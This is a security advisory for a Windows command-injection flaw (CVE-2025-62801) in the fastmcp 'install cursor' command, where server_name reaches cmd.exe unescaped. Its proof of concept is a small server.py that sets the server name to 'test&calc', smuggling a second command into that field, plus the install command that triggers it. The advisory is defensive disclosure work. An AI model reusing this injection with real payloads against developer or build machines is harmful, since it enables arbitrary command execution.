# [M] FastMCP vulnerable to windows command injection in FastMCP Cursor installer via server_name

## Summary
Severity: Medium
Advisory: GHSA-rj5c-58rq-j5g5
CVE: CVE-2025-62801
CWE: CWE-78
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-10-29
Source: https://github.com/advisories/GHSA-rj5c-58rq-j5g5
Type: github-advisory

## Affected
- PyPI: `fastmcp` — affected >=0 <2.13.0

## Details
### Summary
A command-injection vulnerability lets any attacker who can influence the server_name field of an MCP execute arbitrary OS commands on Windows hosts that run fastmcp install cursor

### Details
1. generate_cursor_deeplink(server_name, …) embeds server_name verbatim in a cursor://…?name= query string.
2. open_deeplink() is invoked with shell=True only on Windows. That calls cmd.exe /c start <deeplink>.
3. Any cmd metacharacter inside server_name (&, |, >, ^, …) escapes the start command and spawns an attacker-chosen process.

### PoC
server.py 
```

import random
from fastmcp import FastMCP

mcp = FastMCP(name="test&calc")

@mcp.tool
def roll_dice(n_dice: int) -> list[int]:
    """Roll `n_dice` 6-sided dice and return the results."""
    return [random.randint(1, 6) for _ in range(n_dice)]

if __name__ == "__main__":
    mcp.run()
```

then run in the terminal:
`fastmcp install cursor server.py`

### Impact
OS Command / Shell Injection (CWE-78)
Every Windows host that runs fastmcp install cursor is at risk. Developers on their local workstations, CI/CD agents and corporate build machines alike.

## References
- https://github.com/jlowin/fastmcp/security/advisories/GHSA-rj5c-58rq-j5g5
- https://nvd.nist.gov/vuln/detail/CVE-2025-62801
- https://github.com/jlowin/fastmcp
